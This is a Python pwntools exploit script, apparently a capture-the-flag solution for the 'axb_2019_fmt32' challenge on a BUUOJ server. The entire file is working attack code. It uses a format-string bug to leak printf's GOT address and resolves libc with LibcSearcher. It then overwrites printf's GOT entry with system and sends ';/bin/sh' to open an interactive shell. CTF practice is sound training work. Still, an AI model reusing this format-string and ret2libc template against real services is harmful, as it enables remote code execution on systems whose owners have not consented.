from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './axb_2019_fmt32'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 28576) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def exec_fmt(payload):
	sla('me:',payload)
	info = ru('\n')
	return info
auto = FmtStr(exec_fmt)
offset = auto.offset

sla('me:','a'+p32(elf.got['printf'])+'%{}$s'.format(offset))
printf = u32(r()[14:18])
leak('printf',printf)
system,binsh = ret2libc(printf,'printf')
payload = 'a'+fmtstr_payload(offset,{elf.got['printf']:system},numbwritten=10)
sl(payload)
ru('\n')
sl(';/bin/sh\x00')
# end

itr()
